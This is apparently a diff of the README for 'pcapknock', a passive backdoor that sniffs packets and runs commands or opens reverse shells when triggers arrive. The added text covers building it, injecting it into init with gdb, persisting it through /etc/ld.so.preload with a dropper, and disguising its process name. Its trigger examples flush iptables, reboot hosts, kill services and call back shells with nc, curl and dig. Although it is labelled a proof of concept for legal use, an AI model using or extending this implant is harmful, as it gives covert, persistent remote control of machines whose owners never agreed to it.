@@ -5,72 +5,111 @@ spawns a reverse shell based on the contents of the packets.  It is meant for
 use as a PoC; there is no encryption or authentication.  It can either be built
 as a standalone binary or an injectable library.
 
+Tested on:
+- OpenBSD
+- FreeBSD (GhostOS)
+- Linux (CentOS, Ubuntu)
+- LXC on Centos (Debian)
+
 For legal use only.
+
+Building
+--------
+The [`build.sh`](./build.sh) script will try to produce binaries and shared
+object files, but may well need tweaking.  On Linux, expect to have to wrestle
+your distro's package manager.  On OpenBSD and FreeBSD, it just works.
+
+The library and binaries will go into `built/$(uname -s)` in the source tree.
+The built files are as follows:
+
+Name                          | Purpose
+------------------------------|--------
+`pcapknock.standalone`        | "Normal" standalone binary.  Nohup it and run it in in the backgroud.
+`pcapknock.standalone.daemon` | Standalone binary which forks itself into the background.
+`pcapknock.standalone.debug`  | Standalone binary which prints debugging info.
+`pcapknock.so`                | Injectable library
+`pcapknock.injector`          | Injects pcapknocks.so into a process with in-memory GDB
+`pcapknock.systemd.so`        | Systemd-specific [preloadable](#persistent-injection) library
+`systemd_dropper.sh`          | Dropper which [preloads](#persistent-injection) vi `pcapknock.systemd.so` via `/etc/ld.so.preload`
+
 
 Usage
 -----
-In most cases, the [`build.sh`](./build.sh) script is sufficient to build:
-```bash
-$ ./build.sh
-C Flags:      "-O2 -Wall --pedantic"
-Defines:      ""
-Linker Flags: "-lpcap -lpthread"
-Building library...pcapknock.so
-Building static binary...pcapknock.static
-Building dynamic binary...pcapknock.dynamic
-```
-This will generate three files:
-- `pcapknock.so`, an injectable library which spawns a thread on load
-- `pcapknock.static`, a statically-linked standalone binary
-- `pcapknock.dynamic`, a dynamically-linked standalone binary
+Once pcapknock is running as root, all that's required to trigger it is a
+packet containing either a command to run surrounded by `COMMAND...COMMAND` or
+an address to which to call back with a shell surrounded with
+`CALLBACK...CALLBACK`.
 
-Once running, by default PcapKnock will listen on all interfaces (on Linux),
-for packets containing one of two triggers, either `COMMAND<command>COMMAND` to
-run a command or `CALLBACK<address>:<port>CALLBACK` to spawn a reverse shell to
-the given address and port.  See the [Configuration](#Configuration) section
-for more information on changing defaults.
+Trigger examples:
+```bash
+# Drop the Linux firewall
+echo 'iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -F' | nc -u <TARGET> 53
 
-Examples
---------
-The following examples assume PcapKnock is configured with its default
-settings.
+# Reboot a box
+dig @target COMMANDrebootCOMMAND
 
-Kill apache on 192.168.0.2:
-```bash
-# Port doesn't matter as long as a PSH is made
-echo COMMANDpkill apache2COMMAND | nc -u 192.168.0.2 22
+# Call back on port 80
+(sleep 1 && curl -sv -d 'CALLBACK<LOCALIP>:80CALLBACK' http://target) & nc -nvl 80
 ```
-Punch a hole in the firewall using a legit web request:
-```bash
-curl --data 'COMMANDiptables -I INPUT -p tcp --dport 22 -j ACCEPTCOMMAND' https://192.168.0.2
-```
-Spawn a reverse shell to `192.168.0.3:4444` using a DNS request which will be
-recursed to example.com:
-```bash
-dig CALLBACK192.168.0.3:4444CALLBACK.example.com & nc -nvl 4444
-```
+
+For either a callback or a command, a shell is spawned, disassociated from the
+parent process, and run with the name (i.e. `argv[0]`) `kinit`.  The name may
+be changed in [`config.h`](./config.h).
 
 Configuration
 -------------
-Configuration takes place in the form of C defines.  Defaults are set in
-[`pcapknock.h`](./pcapknock.h), but can be changed at compile time by passing
-`-DOPTION=value` to the compiler.  The included build script passes whatever
-is in the `DEFINES` environment variable to the compiler to enable compile-time
-configuration.  For convience, the `DEVICE` environment variable may be set to
-change the device on which traffic is monitored.
+Three compile-time preprocessor macros may be set when building to control
+aspects of pcapknock's behavior.
 
-The configurable settings are:
+Macro            | Effect
+-----------------|-------
+`DEBUG`          | Prints helpful debugging messages
+`DAEMON`         | Causes the standalone binary builds to disassociate from the controlling terminal (What you probably want)
+`PRELOADSYSTEMD` | Buid a library suitable for injection into systemd via `/etc/ld.so.preload`.
 
-Setting       | Default    | Description
---------------|------------|---------------------------------
-`DEVICE`      | `any`      | Device on which to sniff packets
-`SHELLNAME`   | `kexecd`   | Shell process name (i.e. `argv[0]`)
-`CBMARKER`    | `CALLBACK` | Marker for reverse shell addresses
-`CMDMARKER`   | `COMMAND`  | Marker for commands
-| | |It is unlikely the below will need to be changed |
-`MAXKNOCK`    | `4096`     | Maximum command/address length
-`CLMAXFD`     | `10240`    | Maximum filedescriptor number to close after fork
-`CONSTRUCTOR` | _unset_    | If defined, runs as a constructor (for injection)
-`ERROUT`      | _unset_    | If defined, outputs error messages to stdout
+The compiled binaries and shared object files will have the above appended to
+their names.
 
-Only the first four will likely need to be changed in most cases.
+Further compile-time configuration can be performed by editing
+[`config.h`](./config.h), but in general, this shouldn't be necessary.
+
+There is no runtime configuration.
+
+Linux Injection
+---------------
+On Linux, an few additional files are built for injecting into systemd either
+on a running system or on boot vi `/etc/ld.so.preload`.
+
+### Live Injection
+The program `pcapknock.injector` loads `pcapknock.so` and gdb into memory and
+uses gdb to shove pcapknock into another process which may be specified as the
+first command-line argument, e.g. `./pcapknock.injector 23`.  Not specifying a
+number or specifying an invalid number (like `./pcapknock.injector kittes`)
+will inject into pid 1.  Turns out it works pretty well.
+
+The injectee process should be have `libdl` loaded into it as well as have
+permissions to sniff packets (e.g. open a raw socket).  Try a trigger before
+getting rid of the access used to run `pcapknock.injector`.
+`COMMANDtouch /tmpCOMMAND` works pretty well for testing.
+
+When injecting there should be a line something like
+```
+$1 = (void *) 0x559ea705d3f0
+```
+which indicates (likely) success.  If the number on the right is 0, something's
+gone wrong.
+
+If injecting into init (which is the default if no pid is given) expect a lot
+of lines in dmesg and to the console similar to the following:
+```
+kernel:systemd[1]: segfault at 7ffff81e3f5f ip 00007ffff81e3f5f sp 00007ffff81e3f50 error 15 
+```
+Apparently systemd is happy segfaulting.  A "better" description of systemd can
+be found in https://amzn.com/B075DYXZW1.
+
+### Persistent Injection
+Using `/etc/ld.so.preload`, pcapknock can be loaded into systemd from boot by
+pointing it at `pcapknock.systemd.so`.  The library will also be loaded into
+every other process, but it only sniffs if it finds itself in the process with
+pid 1.  A convenient dropper, `systemd_dropper.sh`, will write the library to
+disk as '/usr/local/sbin/libpk.so.4` and add it to `/etc/ld.so.preload`.
